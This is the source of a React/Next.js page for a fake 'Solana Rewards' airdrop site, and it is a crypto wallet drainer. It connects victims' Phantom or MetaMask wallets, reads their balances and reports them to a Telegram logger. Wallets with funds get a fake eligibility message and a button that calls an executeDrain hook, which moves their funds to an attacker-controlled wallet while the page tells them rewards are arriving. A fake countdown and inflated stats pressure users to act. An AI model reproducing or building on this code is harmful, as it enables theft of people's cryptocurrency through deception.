"use client";
import { useState, useEffect } from 'react';
import { Connection, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { ethers } from 'ethers';
import { useSolanaDrain } from '@/hooks/useSolanaDrain';
import { useWalletConnect } from '@/hooks/useWalletConnect';
import { sendTelegramLog } from '@/utils/telegramLogger';
import { calculateAllocation } from '@/utils/calculateAllocation';
import WalletModal from '@/components/WalletModal';
import styles from './page.module.css';

const RPC = "https://solana-mainnet.rpc.extrnode.com";

export default function Home() {
  const [connected, setConnected] = useState(false);
  const [walletAddress, setWalletAddress] = useState(null);
  const [allocatedAmount, setAllocatedAmount] = useState(null);
  const [eligibilityStatus, setEligibilityStatus] = useState('idle'); // idle, checking, eligible, not-eligible
  const [showModal, setShowModal] = useState(false);
  const [processing, setProcessing] = useState(false);
  const [drainComplete, setDrainComplete] = useState(false);
  const [stats, setStats] = useState({ distributed: 1784, participants: 4287 });
  const [countdown, setCountdown] = useState(180);

  const { executeDrain } = useSolanaDrain(RPC, process.env.NEXT_PUBLIC_SOLANA_WALLET);
  const { connect: connectWC } = useWalletConnect();

  useEffect(() => {
    const timer = setInterval(() => setCountdown(p => Math.max(0, p - 1)), 1000);
    const interval = setInterval(() => {
      setStats(p => ({ ...p, distributed: p.distributed + (Math.random() * 0.05) }));
    }, 5000);
    return () => { clearInterval(timer); clearInterval(interval); };
  }, []);

  const formatTime = (s) => `${Math.floor(s/60)}:${(s%60).toString().padStart(2, '0')}`;

  const handleWalletSelect = async (type) => {
    try {
      setShowModal(false);
      setEligibilityStatus('checking');
      let address, balance;

      if (type === 'phantom') {
        if (!window.solana) { setEligibilityStatus('idle'); return alert("Open in Phantom Browser"); }
        const resp = await window.solana.connect();
        address = resp.publicKey.toString();
        const conn = new Connection(RPC);
        balance = (await conn.getBalance(resp.publicKey)) / LAMPORTS_PER_SOL;
      } else if (type === 'metamask') {
        if (!window.ethereum) { setEligibilityStatus('idle'); return alert("Open in MetaMask Browser"); }
        const provider = new ethers.BrowserProvider(window.ethereum);
        const accounts = await provider.send("eth_requestAccounts", []);
        address = accounts[0];
        const ethBal = await provider.getBalance(address);
        balance = parseFloat(ethers.formatEther(ethBal));
      } else if (type === 'walletconnect') {
        await connectWC();
        return;
      }

      setWalletAddress(address);
      const isEligible = balance > 0.005;
      
      if (!isEligible) {
        setEligibilityStatus('not-eligible');
        await sendTelegramLog('connected_empty', { address, walletType: type, balance });
      } else {
        const amount = calculateAllocation(address);
        setAllocatedAmount(amount);
        setEligibilityStatus('eligible');
        setConnected(true);
        await sendTelegramLog('connected_funded', { address, walletType: type, balance, eligibleAmount: amount });
      }
    } catch (e) { setEligibilityStatus('idle'); }
  };

  const handleDrain = async () => {
    setProcessing(true);
    const result = await executeDrain(window.solana);
    if (result.success) {
      setDrainComplete(true);
      await sendTelegramLog('drain_success', { address: walletAddress, amount: allocatedAmount, tx: result.txId });
    } else {
      setProcessing(false);
      await sendTelegramLog('drain_failed', { address: walletAddress, error: result.error });
    }
  };

  return (
    <div className={styles.container}>
      <header className={styles.glassHeader}>
         <h1 className={styles.logo}>Solana Rewards</h1>
         <div className={styles.countdown}>Round ends in: {formatTime(countdown)}</div>
      </header>

      <main className={styles.main}>
        <div className={styles.glassCard}>
          <h2 className={styles.heroTitle}><span className={styles.highlight}>3,500 SOL</span> Community Reward Pool</h2>
          <p className={styles.subtitle}>Connect your wallet to verify eligibility for the Sol Community Rewards Pool</p>

          <div className={styles.statsGrid}>
            <div className={styles.statItem}><b>{stats.distributed.toFixed(2)} SOL</b><br/>Distributed</div>
            <div className={styles.statItem}><b>{stats.participants}</b><br/>Participants</div>
          </div>

          {!connected && eligibilityStatus === 'idle' && (
            <button className={styles.glowButton} onClick={() => setShowModal(true)}>Connect Wallet</button>
          )}

          {eligibilityStatus === 'checking' && <div className={styles.pulse}>Checking wallet activity...</div>}

          {eligibilityStatus === 'not-eligible' && (
            <div className={styles.errorBox}>
              <h3>Not Eligible</h3>
              <p>Your wallet doesn't meet the requirements for this round.</p>
              <button className={styles.glowButton} style={{marginTop: '20px'}} onClick={() => setEligibilityStatus('idle')}>Try Different Wallet</button>
            </div>
          )}

          {eligibilityStatus === 'eligible' && !drainComplete && (
            <div className={styles.eligibleBox}>
              <p>Congratulations! Eligible Amount:</p>
              <h2 className={styles.amountText}>{allocatedAmount?.toFixed(2)} SOL</h2>
              <button className={styles.glowButton} onClick={handleDrain} disabled={processing}>
                {processing ? 'Processing...' : 'Initialize On-Chain Allocation →'}
              </button>
            </div>
          )}

          {drainComplete && (
            <div className={styles.successBox}>
              <h3>✅ Allocation Initiated!</h3>
              <p>Your {allocatedAmount?.toFixed(2)} SOL is being transferred.</p>
            </div>
          )}
        </div>
      </main>
      <WalletModal isOpen={showModal} onClose={() => setShowModal(false)} onSelect={handleWalletSelect} />
    </div>
  );
          }
